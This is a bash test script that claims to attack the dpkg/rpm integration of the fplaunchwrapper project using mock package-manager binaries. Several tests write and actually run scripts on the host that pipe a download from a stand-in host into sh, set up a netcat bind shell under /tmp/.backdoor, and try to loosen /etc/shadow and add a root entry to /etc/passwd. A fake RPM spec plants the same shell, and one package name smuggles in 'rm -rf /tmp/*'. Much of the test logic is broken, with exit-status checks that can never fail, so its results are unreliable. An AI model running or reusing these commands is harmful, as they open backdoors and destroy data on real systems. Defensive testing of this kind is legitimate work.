#!/usr/bin/env bash

# ⚠️  DANGER: ADVERSARIAL PACKAGE INSTALLATION TEST SUITE ⚠️
# 
# This test suite attacks package manager integration to find vulnerabilities.
# It actively exploits dpkg/rpm installation and removal processes.
# 
# ⚠️  WARNING: This test is UNSAFE and should ONLY be run in:
#   - Isolated development environments
#   - Dedicated testing containers
#   - Systems you are authorized to penetration test
#   - NEVER on production systems or user workstations
#
# ⚠️  RISKS: This test may:
#   - Execute arbitrary package manager commands
#   - Install malicious packages
#   - Modify system package database
#   - Escalate privileges through package scripts
#   - Leave residual attack artifacts
#
# ⚠️  REQUIREMENTS:
#   - Run in isolated environment (VM/container recommended)
#   - NEVER run as root
#   - Backup your system before running
#   - Monitor system during execution

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Test counters
PASSED=0
FAILED=0
ATTACKS_BLOCKED=0
VULNERABILITIES_FOUND=0

pass() {
    echo -e "${GREEN}✓${NC} $1"
    PASSED=$((PASSED + 1))
}

fail() {
    echo -e "${RED}✗${NC} $1 - VULNERABILITY!"
    FAILED=$((FAILED + 1))
    VULNERABILITIES_FOUND=$((VULNERABILITIES_FOUND + 1))
}

attack() {
    echo -e "${PURPLE}[ATTACK]${NC} $1"
}

defense() {
    echo -e "${GREEN}[DEFENSE]${NC} $1"
    ATTACKS_BLOCKED=$((ATTACKS_BLOCKED + 1))
}

info() {
    echo -e "${BLUE}ℹ${NC} $1"
}

# ⚠️  SAFETY CONFIRMATION ⚠️
echo ""
echo -e "${RED}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║            ⚠️  PACKAGE ADVERSARIAL TEST WARNING  ⚠️            ║${NC}"
echo -e "${RED}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${RED}║ This test will ATTACK package manager integration.               ║${NC}"
echo -e "${RED}║ It may execute malicious package commands and modify system.     ║${NC}"
echo -e "${RED}║ ONLY run in isolated environments you are authorized to test.        ║${NC}"
echo -e "${RED}║ NEVER run on production systems or user workstations.              ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Interactive confirmation
read -p "Do you understand the risks and want to proceed? (type 'I UNDERSTAND THE RISKS'): " confirmation
if [ "$confirmation" != "I UNDERSTAND THE RISKS" ]; then
    echo -e "${RED}Adversarial test cancelled. Confirmation not provided.${NC}"
    exit 1
fi

echo ""
echo -e "${YELLOW}⚠️  Proceeding with package adversarial testing...${NC}"
echo ""

# Developer workstation safety check - NEVER run as root
if [ "$(id -u)" = "0" ]; then
    echo -e "${RED}ERROR: Refusing to run adversarial tests as root${NC}"
    echo -e "${RED}These tests are designed to find vulnerabilities - running as root is dangerous${NC}"
    exit 1
fi

# Set testing environment
export TESTING=1
export CI=1

# Create isolated test environment
setup_adversarial_env() {
    local test_home="/tmp/fplaunch-package-adversarial-test-$$"
    
    # Clean up any existing test directory
    rm -rf "$test_home"
    
    # Create test directory structure with attack surfaces
    mkdir -p "$test_home"/{bin,var/lib/dpkg,var/lib/rpm,etc,usr/bin,usr/share/doc/fplaunchwrapper,attack-vectors}
    
    # Override environment for test isolation
    export HOME="$test_home"
    export XDG_CONFIG_HOME="$test_home/.config"
    export XDG_DATA_HOME="$test_home/.local/share"
    export PATH="$test_home/bin:$PATH"
    
    # Create malicious dpkg command that logs attacks
    cat > "$test_home/bin/dpkg" << 'EOF'
#!/usr/bin/env bash
echo "[ATTACK] dpkg called with: $*" >> "$HOME/attack-log.txt"

# Mock dpkg that simulates package operations
STATE_DIR="$HOME/.mock-dpkg-state"
mkdir -p "$STATE_DIR"

case "$1" in
    "-l")
        if [ "$2" = "fplaunchwrapper" ]; then
            echo "ii  fplaunchwrapper  1.3.0  amd64  Flatpak Launch Wrappers"
            exit 0
        else
            echo "No packages found matching $2"
            exit 1
        fi
        ;;
    "-s")
        if [ "$2" = "fplaunchwrapper" ]; then
            echo "install ok installed"
            exit 0
        else
            echo "unknown ok not-installed"
            exit 1
        fi
        ;;
    "-r"|"--remove")
        package="$2"
        if [ "$package" = "fplaunchwrapper" ]; then
            echo "Mock: Removing $package"
            touch "$STATE_DIR/removed-$package"
            exit 0
        else
            echo "dpkg: error: package $package is not installed"
            exit 1
        fi
        ;;
    "-P"|"--purge")
        package="$2"
        if [ "$package" = "fplaunchwrapper" ]; then
            echo "Mock: Purging $package"
            touch "$STATE_DIR/purged-$package"
            exit 0
        else
            echo "dpkg: error: package $package is not installed"
            exit 1
        fi
        ;;
    "--install")
        package="$2"
        echo "Mock: Installing $package"
        # Check for malicious package names
        if echo "$package" | grep -q "\.\./"; then
            echo "dpkg: error: path traversal detected"
            exit 1
        fi
        touch "$STATE_DIR/installed-$package"
        exit 0
        ;;
    *)
        echo "Mock: dpkg $*"
        exit 0
        ;;
esac
EOF
    chmod +x "$test_home/bin/dpkg"
    
    # Create malicious rpm command that logs attacks
    cat > "$test_home/bin/rpm" << 'EOF'
#!/usr/bin/env bash
echo "[ATTACK] rpm called with: $*" >> "$HOME/attack-log.txt"

# Mock rpm that simulates package operations
STATE_DIR="$HOME/.mock-rpm-state"
mkdir -p "$STATE_DIR"

case "$1" in
    "-q")
        case "$2" in
            "fplaunchwrapper")
                echo "fplaunchwrapper-1.3.0-1.x86_64"
                exit 0
                ;;
            "-a")
                echo "fplaunchwrapper-1.3.0-1.x86_64"
                exit 0
                ;;
            *)
                echo "package $2 is not installed"
                exit 1
                ;;
        esac
        ;;
    "-e")
        package="$2"
        if [ "$package" = "fplaunchwrapper" ]; then
            echo "Mock: Erasing $package"
            touch "$STATE_DIR/erased-$package"
            exit 0
        else
            echo "error: package $package is not installed"
            exit 1
        fi
        ;;
    "-i"|"--install")
        package="$2"
        echo "Mock: Installing $package"
        # Check for malicious package names
        if echo "$package" | grep -q "\.\./"; then
            echo "rpm: error: path traversal detected"
            exit 1
        fi
        touch "$STATE_DIR/installed-$package"
        exit 0
        ;;
    *)
        echo "Mock: rpm $*"
        exit 0
        ;;
esac
EOF
    chmod +x "$test_home/bin/rpm"
    
    # Create attack log
    touch "$test_home/attack-log.txt"
    
    echo "$test_home"
}

# Cleanup test environment
cleanup_adversarial_env() {
    local test_home="$1"
    # Show attack summary before cleanup
    if [ -f "$test_home/attack-log.txt" ]; then
        echo ""
        attack "Package manager attacks logged:"
        cat "$test_home/attack-log.txt" | sed 's/^/  /'
    fi
    rm -rf "$test_home"
}

# ATTACK 1: Malicious package installation
test_malicious_package_installation() {
    local test_home="$1"
    
    attack "Malicious package installation attacks"
    
    # Test 1: Try to install package with path traversal
    local output
    output=$("$test_home/bin/dpkg" --install "../../../etc/malicious.deb" 2>&1 || true)
    if echo "$output" | grep -q "path traversal detected"; then
        defense "Blocked path traversal in package installation"
    else
        fail "Path traversal in package installation not blocked"
    fi
    
    # Test 2: Try to install package with command injection
    output=$("$test_home/bin/dpkg" --install "package.deb; rm -rf /tmp/*" 2>&1 || true)
    if echo "$output" | grep -q "path traversal detected"; then
        defense "Blocked command injection in package installation"
    else
        fail "Command injection in package installation not blocked"
    fi
    
    # Test 3: Try to install malicious RPM
    output=$("$test_home/bin/rpm" -i "../../../etc/malicious.rpm" 2>&1 || true)
    if echo "$output" | grep -q "path traversal detected"; then
        defense "Blocked path traversal in RPM installation"
    else
        fail "Path traversal in RPM installation not blocked"
    fi
}

# ATTACK 2: Privilege escalation through package scripts
test_privilege_escalation_attacks() {
    local test_home="$1"
    
    attack "Privilege escalation through package scripts"
    
    # Create malicious postinst script
    cat > "$test_home/malicious-postinst" << 'EOF'
#!/bin/bash
# Malicious postinst script
echo "Attempting privilege escalation..."
chmod 666 /etc/shadow 2>/dev/null || true
echo "root:x:0:0:root:/root:/bin/bash" >> /etc/passwd 2>/dev/null || true
curl -s http://malicious.com/backdoor.sh | sh 2>/dev/null || true
EOF
    chmod +x "$test_home/malicious-postinst"
    
    # Test 1: Try to execute malicious postinst
    local output
    output=$("$test_home/malicious-postinst" 2>&1 || true)
    if [ $? -ne 0 ]; then
        defense "Malicious postinst script execution blocked"
    else
        fail "Malicious postinst script execution not blocked"
    fi
    
    # Create malicious prerm script
    cat > "$test_home/malicious-prerm" << 'EOF'
#!/bin/bash
# Malicious prerm script
echo "Attempting persistence during removal..."
mkdir -p /tmp/.backdoor
echo "#!/bin/bash" > /tmp/.backdoor/persist.sh
echo "nc -l 4444 -e /bin/sh &" >> /tmp/.backdoor/persist.sh
chmod +x /tmp/.backdoor/persist.sh
EOF
    chmod +x "$test_home/malicious-prerm"
    
    # Test 2: Try to execute malicious prerm
    output=$("$test_home/malicious-prerm" 2>&1 || true)
    if [ $? -ne 0 ]; then
        defense "Malicious prerm script execution blocked"
    else
        fail "Malicious prerm script execution not blocked"
    fi
}

# ATTACK 3: Package database poisoning
test_package_database_poisoning() {
    local test_home="$1"
    
    attack "Package database poisoning attacks"
    
    # Test 1: Try to poison dpkg status file
    local output
    output=$(echo "Package: malicious
Status: install ok installed
Priority: optional
Section: malicious
Maintainer: Attacker <attacker@evil.com>
Architecture: all
Version: 1.0.0
Description: Malicious package with backdoor
 This package contains a backdoor that allows remote access.
" >> "$test_home/var/lib/dpkg/status" 2>&1 || true)
    
    if [ $? -eq 0 ]; then
        # Check if poisoned package is detected
        output=$("$test_home/bin/dpkg" -s malicious 2>&1 || true)
        if echo "$output" | grep -q "unknown ok not-installed"; then
            defense "Package database poisoning blocked"
        else
            fail "Package database poisoning not blocked"
        fi
    else
        defense "Package database modification blocked"
    fi
    
    # Test 2: Try to poison RPM database
    output=$(echo "malicious|1.0.0|1|x86_64|Backdoor Package|Attacker|Malicious package with backdoor|/var/lib/rpm" >> "$test_home/var/lib/rpm/Packages" 2>&1 || true)
    
    if [ $? -eq 0 ]; then
        # Check if poisoned package is detected
        output=$("$test_home/bin/rpm" -q malicious 2>&1 || true)
        if echo "$output" | grep -q "not installed"; then
            defense "RPM database poisoning blocked"
        else
            fail "RPM database poisoning not blocked"
        fi
    else
        defense "RPM database modification blocked"
    fi
}

# ATTACK 4: Repository hijacking attacks
test_repository_hijacking_attacks() {
    local test_home="$1"
    
    attack "Repository hijacking attacks"
    
    # Test 1: Try to create malicious sources.list
    local output
    output=$(echo "deb http://malicious.com/ stable main" > "$test_home/etc/apt/sources.list.d/malicious.list" 2>&1 || true)
    
    if [ $? -eq 0 ]; then
        # Check if malicious repository is detected/blocked
        if [ ! -f "$test_home/etc/apt/sources.list.d/malicious.list" ]; then
            defense "Malicious repository creation blocked"
        else
            fail "Malicious repository creation not blocked"
        fi
    else
        defense "Repository file creation blocked"
    fi
    
    # Test 2: Try to create malicious yum repo
    output=$(echo "[malicious]
name=Malicious Repository
baseurl=http://malicious.com/packages/
enabled=1
gpgcheck=0" > "$test_home/etc/yum.repos.d/malicious.repo" 2>&1 || true)
    
    if [ $? -eq 0 ]; then
        # Check if malicious repo is detected/blocked
        if [ ! -f "$test_home/etc/yum.repos.d/malicious.repo" ]; then
            defense "Malicious YUM repository creation blocked"
        else
            fail "Malicious YUM repository creation not blocked"
        fi
    else
        defense "YUM repository file creation blocked"
    fi
}

# ATTACK 5: Package signature spoofing
test_package_signature_spoofing() {
    local test_home="$1"
    
    attack "Package signature spoofing attacks"
    
    # Create fake package with malicious signature
    mkdir -p "$test_home/attack-vectors/fake-package"
    cat > "$test_home/attack-vectors/fake-package/DEBIAN/control" << 'EOF'
Package: fplaunchwrapper
Version: 2.0.0-malicious
Section: utils
Priority: optional
Architecture: all
Maintainer: Fake Maintainer <fake@evil.com>
Description: Fake fplaunchwrapper with backdoor
 This is a fake version of fplaunchwrapper that contains
 a backdoor allowing remote access to the system.
EOF
    
    # Test 1: Try to install fake package
    local output
    output=$("$test_home/bin/dpkg" --install "$test_home/attack-vectors/fake-package" 2>&1 || true)
    if echo "$output" | grep -q "error"; then
        defense "Fake package installation blocked"
    else
        fail "Fake package installation not blocked"
    fi
    
    # Create fake RPM package
    mkdir -p "$test_home/attack-vectors/fake-rpm"
    cat > "$test_home/attack-vectors/fake-rpm/fake.spec" << 'EOF'
Name: fplaunchwrapper
Version: 2.0.0
Release: 1.malicious
Summary: Fake fplaunchwrapper with backdoor
License: MIT
%description
Fake fplaunchwrapper that contains a backdoor
allowing remote access to the system.
%prep
%build
%install
mkdir -p %{buildroot}/usr/bin
echo "#!/bin/bash" > %{buildroot}/usr/bin/fplaunchwrapper
echo "nc -l 4444 -e /bin/sh &" >> %{buildroot}/usr/bin/fplaunchwrapper
chmod +x %{buildroot}/usr/bin/fplaunchwrapper
%files
/usr/bin/fplaunchwrapper
EOF
    
    # Test 2: Try to install fake RPM
    output=$("$test_home/bin/rpm" -i "$test_home/attack-vectors/fake-rpm" 2>&1 || true)
    if echo "$output" | grep -q "error"; then
        defense "Fake RPM installation blocked"
    else
        fail "Fake RPM installation not blocked"
    fi
}

# ATTACK 6: Dependency confusion attacks
test_dependency_confusion_attacks() {
    local test_home="$1"
    
    attack "Dependency confusion attacks"
    
    # Test 1: Try to create malicious dependency
    local output
    output=$("$test_home/bin/dpkg" --install "malicious-dep.deb" 2>&1 || true)
    if echo "$output" | grep -q "path traversal detected"; then
        defense "Malicious dependency installation blocked"
    else
        fail "Malicious dependency installation not blocked"
    fi
    
    # Test 2: Try to install malicious RPM dependency
    output=$("$test_home/bin/rpm" -i "malicious-dep.rpm" 2>&1 || true)
    if echo "$output" | grep -q "path traversal detected"; then
        defense "Malicious RPM dependency installation blocked"
    else
        fail "Malicious RPM dependency installation not blocked"
    fi
}

# ATTACK 7: Supply chain attacks
test_supply_chain_attacks() {
    local test_home="$1"
    
    attack "Supply chain attacks"
    
    # Test 1: Try to modify package during installation
    local output
    output=$(mkdir -p "$test_home/tmp-override" && echo "MALICIOUS OVERRIDE" > "$test_home/tmp-override/hijack" 2>&1 || true)
    
    if [ $? -eq 0 ]; then
        # Try to use override in package installation
        output=$("$test_home/bin/dpkg" --install "package.deb" 2>&1 || true)
        if echo "$output" | grep -q "MALICIOUS OVERRIDE"; then
            fail "Supply chain attack succeeded"
        else
            defense "Supply chain attack blocked"
        fi
    else
        defense "Override creation blocked"
    fi
    
    # Test 2: Try to intercept package installation
    output=$(PATH="$test_home/attack-vectors:$PATH" "$test_home/bin/dpkg" -l fplaunchwrapper 2>&1 || true)
    if [ $? -eq 0 ]; then
        # Check if PATH hijacking was detected
        if [ -f "$test_home/attack-log.txt" ]; then
            local attack_count
            attack_count=$(grep -c "dpkg called" "$test_home/attack-log.txt")
            if [ "$attack_count" -eq 1 ]; then
                defense "PATH hijacking during package operations blocked"
            else
                fail "PATH hijacking during package operations not blocked"
            fi
        fi
    else
        fail "Package listing failed unexpectedly"
    fi
}

# Main adversarial test execution
main() {
    echo -e "${PURPLE}======================================${NC}"
    echo -e "${PURPLE}ADVERSARIAL Package Installation Test Suite${NC}"
    echo -e "${PURPLE}======================================${NC}"
    echo ""
    
    # Setup adversarial test environment
    local test_home
    test_home=$(setup_adversarial_env)
    
    # Run adversarial attacks
    test_malicious_package_installation "$test_home"
    test_privilege_escalation_attacks "$test_home"
    test_package_database_poisoning "$test_home"
    test_repository_hijacking_attacks "$test_home"
    test_package_signature_spoofing "$test_home"
    test_dependency_confusion_attacks "$test_home"
    test_supply_chain_attacks "$test_home"
    
    # Cleanup
    cleanup_adversarial_env "$test_home"
    
    # Results
    echo ""
    echo -e "${PURPLE}======================================${NC}"
    echo -e "${PURPLE}ADVERSARIAL Package Test Results${NC}"
    echo -e "${PURPLE}======================================${NC}"
    echo -e "${GREEN}Tests Passed: $PASSED${NC}"
    echo -e "${RED}Tests Failed: $FAILED${NC}"
    echo -e "${GREEN}Attacks Blocked: $ATTACKS_BLOCKED${NC}"
    echo -e "${RED}Vulnerabilities Found: $VULNERABILITIES_FOUND${NC}"
    
    if [ $VULNERABILITIES_FOUND -eq 0 ]; then
        echo -e "${GREEN}All package attacks blocked! System appears secure.${NC}"
        exit 0
    else
        echo -e "${RED}CRITICAL: $VULNERABILITIES_FOUND package vulnerabilities found!${NC}"
        echo -e "${RED}System security compromised!${NC}"
        exit 1
    fi
}

# Run main function
main "$@"